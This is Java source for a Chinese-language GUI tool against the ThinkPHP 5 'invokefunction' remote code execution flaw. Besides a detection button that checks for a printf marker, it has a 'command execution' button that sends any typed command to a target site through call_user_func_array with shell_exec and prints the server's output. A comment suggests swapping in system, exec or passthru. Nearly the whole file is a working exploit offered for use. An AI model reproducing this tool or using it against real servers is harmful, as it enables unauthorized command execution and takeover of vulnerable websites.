import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class Main {
    public static void main(String[] args) {
        JFrame f=new JFrame("TP5-invokefunctionRCE检测工具   By:nokali");
        f.setSize(570,450);
        f.setLocation(200,200);
        f.setLayout(null);    //程序主窗体

        JLabel target_label=new JLabel("URL:");
        JTextField target_text=new JTextField("");
        target_label.setBounds(30,20,50,30);
        target_text.setBounds(80,20,250,30);    //URL提示标签和URL输入框

        JButton submit=new JButton("一键检测");
        submit.setBounds(350,20,120,30);
        JTextArea output=new JTextArea("");
        //output.setBounds(30,120,450,250);
        output.setLineWrap(true);
        JScrollPane scroll=new JScrollPane(output);
        scroll.setBounds(30,120,450,250);
        scroll.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);    //检测按钮和输出结果文本框

        JLabel cmd_label=new JLabel("CMD:");
        JTextField cmd_text=new JTextField("");
        cmd_label.setBounds(30,70,50,30);
        cmd_text.setBounds(80,70,250,30);    //执行命令提示标签和命令输入框

        JButton execute=new JButton("命令执行");
        execute.setBounds(350,70,120,30);

        submit.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String payload=target_text.getText()+"/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=112233";
                output.append("[*]正在访问URL："+payload);
                output.append(String.format("%n%n"));
                try {
                    URL url=new URL(payload);
                    HttpURLConnection connection=(HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");
                    connection.connect();    //执行访问操作
                    InputStream is=connection.getInputStream();
                    InputStreamReader isr=new InputStreamReader(is,"utf-8");
                    BufferedReader br=new BufferedReader(isr);
                    StringBuffer sb=new StringBuffer();
                    String temp;
                    while((temp=br.readLine())!=null){
                        sb.append(temp);    //循环填入缓冲区
                    }
                    String res=sb.toString();
                    output.append("[*]返回结果为："+res);
                    output.append(String.format("%n%n"));
                    if(res.contains("112233")){    //payload成功执行后会打印112233在回显中，说明存在漏洞
                        output.append("[+]检测成功，存在远程命令执行漏洞");
                        output.append(String.format("%n%n"));
                    }else{
                        output.append("[-]检测失败，未检测出远程命令执行漏洞");
                        output.append(String.format("%n%n"));
                    }
                } catch (IOException ex) {
                    throw new RuntimeException(ex);
                }
            }
        });

        execute.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String cmd;
                cmd=cmd_text.getText().replace(" ","+");    //替换空格为加号，防止在拼接payload时出错
                String payload=target_text.getText()+"/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]="+cmd;
                //如需修改命令执行函数，改写上面这行的shell_exec为需要的函数即可（如system/exec/passthru等）

                output.append("[*]正在访问URL："+payload);
                output.append(String.format("%n%n"));
                try {
                    URL url = new URL(payload);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");
                    connection.connect();
                    InputStream is = connection.getInputStream();
                    InputStreamReader isr = new InputStreamReader(is, "utf-8");
                    BufferedReader br = new BufferedReader(isr);
                    StringBuffer sb = new StringBuffer();
                    String temp;
                    while ((temp = br.readLine()) != null) {
                        sb.append(temp);
                        sb.append(String.format("%n"));
                    }
                    String res = sb.toString();
                    output.append("[+]命令执行回显：");
                    output.append(String.format("%n"));
                    output.append(res);
                    output.append(String.format("%n"));
                } catch (IOException ex) {
                    throw new RuntimeException(ex);
                }
            }
        });

        f.add(target_label);
        f.add(target_text);
        f.add(cmd_label);
        f.add(cmd_text);
        f.add(submit);
        //f.add(output);
        f.add(scroll);
        f.add(execute);    //绘制各组件

        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        f.setVisible(true);

    }
}